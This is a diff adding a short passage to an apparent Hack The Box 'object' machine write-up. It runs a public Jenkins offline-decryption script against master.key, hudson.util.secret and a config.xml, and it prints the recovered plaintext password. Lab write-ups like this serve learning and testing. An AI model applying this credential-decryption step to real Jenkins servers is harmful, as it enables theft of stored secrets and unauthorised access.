@@ -226,3 +226,16 @@ Ill decode this and put it into a file so its valid
 
 Ill also make a config.xml file since it only takes a file
 
+Now i can decrpyt them
+
+https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py
+
+```python
+python3 decrypt.py master.key hudson.util.secret config.xml 
+/home/kali/htb/object/decrypt.py:124: SyntaxWarning: "\{" is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\{"? A raw string is also an option.
+  secrets += re.findall(secret_title + '>\{?(.*?)\}?</' + secret_title, data)
+c1cdfun_d2434
+```
+
+Found a password `c1cdfun_d2434`
+
